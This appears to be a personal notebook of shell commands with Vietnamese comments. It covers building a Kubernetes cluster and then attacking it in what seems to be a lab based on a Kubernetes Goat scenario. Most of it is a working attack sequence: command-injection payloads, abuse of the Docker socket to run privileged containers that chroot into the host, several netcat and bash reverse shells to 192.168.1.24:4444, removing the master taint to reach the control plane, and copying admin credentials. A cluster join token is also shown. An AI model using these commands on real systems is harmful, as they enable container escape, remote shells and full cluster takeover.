sudo hostnamectl set-hostname "k8s-master.ndbien.local"
sudo hostnamectl set-hostname "k8s-worker.ndbien.local"
sudo hostnamectl set-hostname "k8s-worker2.ndbien.local"


sudo nano /etc/hosts

192.168.1.4  k8s-master.ndbien.local k8s-master
192.168.1.5  k8s-worker.ndbien.local k8s-worker
192.168.127.134  k8s-worker2.ndbien.local k8s-worker2

sudo kubeadm init \
  --pod-network-cidr=192.168.0.0/16 \
  --control-plane-endpoint=k8s-master.ndbien.local

kubeadm join k8s-master.ndbien.local:6443 --token z1fw1r.y7thhxcisqh8zvzb \
        --discovery-token-ca-cert-hash sha256:beebe95e807cc174ebb510150981eeb6fc64b9007213844557c1b978e6efd5a9

curl https://raw.githubusercontent.com/projectcalico/calico/v3.25.0/manifests/calico.yaml -O

# kubeadm command
sudo kubeadm reset

sudo kubeadm init

sudo kubeadm init phase certs apiserver

sudo kubeadm init phase kubeconfig admin
--insecure-skip-tls-verify=true

kubectl get pods -n kube-system

kubectl get nodes


 ;/tmp/crictl -r unix:///custom/containerd/containerd.sock pull biladen/php-hack

https://www.letscloud.io/community/how-to-install-kubernetesk8s-and-docker-on-ubuntu-2004

https://nvtienanh.info/blog/cai-dat-kubernetes-cluster-tren-ubuntu-server-22-04

https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-2/docker-in-docker-exploitation-in-kubernetes-containers/welcome/

chmod 666 /var/run/docker.sock

ls -l /custom/docker/docker.sock
DOCKER_HOST=unix:///custom/docker/docker.sock docker version

#kube exec

kubectl exec -it health-check-deployment-77466cffcd-2zjsq     -- /bin/bash
kubectl delete pod health-check-deployment-6684977b6-ttc7m

# lệnh DIND
127.0.0.1; id

; mount

;uname -a

;wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz -O /tmp/docker.tgz

;tar -xvzf /tmp/docker.tgz -C /tmp/
docker/ docker/docker-containerd-ctr docker/docker-proxy docker/docker docker/docker-containerd docker/dockerd docker/docker-init docker/docker-containerd-shim docker/docker-runc
;tmp/docker/docker -H unix:///run/docker.sock images
docker -H unix:///run/cri-dockerd.sock run -it --rm --privileged --net=host --pid=host --ipc=host --volume /:/host ubuntu chroot /host bash

;tmp/docker/docker -H unix:///custom/docker/docker.sock build -t php-hack /data/
;tmp/docker/docker -H unix:///custom/docker/docker.sock run -dp 8089:80 php-hack


docker -H unix:///run/docker.sock  images

docker -H unix:///run/docker.sock run -p 8085:80  ph4n10m1808/hacked_images_docker

hostname -I

docker exec -it a221d98fdd21 curl http://localhost:80

docker -H unix:///run/docker.sock run -p 8085:80 ph4n10m1808/hacked_images_docker

#revershell
bash -c 'bash -i >& /dev/tcp/192.168.1.3/1337 0>&1'



#khai thác RCE
curl --unix-socket /run/docker.sock http://localhost/containers/json 	# kiểm tra quyền

;/tmp/docker/docker -H unix:///run/docker.sock run -i --privileged --network=host  -v /:/host alpine chroot /host /bin/sh 	# lấy quyền root 
;/tmp/docker/docker run --rm --network=host alpine sh -c "nc 192.168.1.24 4444 -e /bin/sh"  #RCE qua docker 


#RCE hiệu quả
;/tmp/docker/docker -H unix:///var/run/docker.sock run -i --rm --privileged   -v /:/host --network=host alpine sh -c  "mkfifo /tmp/p; cat /tmp/p | sh 2>&1 | nc 192.168.1.24 4444 > /tmp/p" 
;/tmp/docker/docker -H unix:///var/run/docker.sock run -i --rm --privileged   -v /:/host --network=host alpine sh -c  "busybox nc 192.168.1.24 4444 -e /bin/sh"

;/tmp/docker/docker -H unix:///var/run/docker.sock run -i --rm --privileged -v /:/host --network=host alpine sh -c "apk update && apk add netcat-traditional bash && nc -e /bin/sh 192.168.1.24 4444"
;/tmp/docker/docker -H unix:///var/run/docker.sock run -it --rm --privileged   -v /:/host --network=host alpine    sh -c "nc 192.168.1.24 4444 -e /bin/sh"


hostname -I 	# hiển thị IP của container
nc 192.168.127.208 4444 -e /bin/sh 	#RCE
ncat.exe -lvp 4444 	#listen
apk add --no-cache netcat-openbsd # cai nc cho docker

/tmp/docker/docker ps -q | xargs -I {} /tmp/docker/docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' {} # kiểm tra IP docker trong pods của k8s
# xóa docker 
docker -H unix:///var/run/docker.sock ps -a --format "{{.ID}} {{.Image}}" | grep -E 'alpine|ubuntu' | awk '{print $1}' | xargs docker -H unix:///var/run/docker.sock rm -f


#escape to host

chroot /host sh		# từ RCE breakout ra máy worker
capsh --print
ls /host-system/
chroot /host-system bash

kubectl describe node k8s-master.ndbien.local | grep Taint 				#kiểm tra taints  (làm pod k chạy trên master duoc)
kubectl taint nodes k8s-master.ndbien.local node-role.kubernetes.io/master:NoSchedule- 	# hủy taints
ls -lah /host/etc/kubernetes
kubectl cp kube-system/root-daemonset-h48sn:/tmp/admin.conf /home/vagrant/admin.conf
kubectl exec -it -n kube-system rce-daemon-mdg5j -- chroot /host /bin/bash 		#RCE vào master thông qua pod

python3 -c 'import pty; pty.spawn("/bin/bash")' 					# upgrade shell
script /dev/null -c bash


# Worker to master
 Get-Content RCE-master.yaml | ncat.exe 192.168.1.3 4444 			# Gui file qua worker de exploit
nc -lvp 4444 > RCE.yaml 							# Nhan file qua window va luu vs en RCE.yaml
cat /etc/passwd | cut -d: -f1							# kiem tra tat ca user tren may
find /home -name "config" -path "*/.kube/config" 2>/dev/null			# tim user nao co fule .kube -> nguoi dung su ung duoc kubetl
sudo -u vagrant kubectl auth can-i '*' '*' --all-namespaces			# kiem tra xem user do co quyen truy cap toan bo kubectl khong
getent group sudo								# kiem tra nguoi dung co quyen sudo
kubectl get pods -n kube-system -o wide						# kiem tra xem pods minh cai vao chay tren master co ID bao nhieu
kubectl exec -i -n kube-system rce-daemon-mdg5j  -- chroot /host /bin/bash	# chay shell cua pod do voi lenh chroot /host /bin/bash de vao root cua master

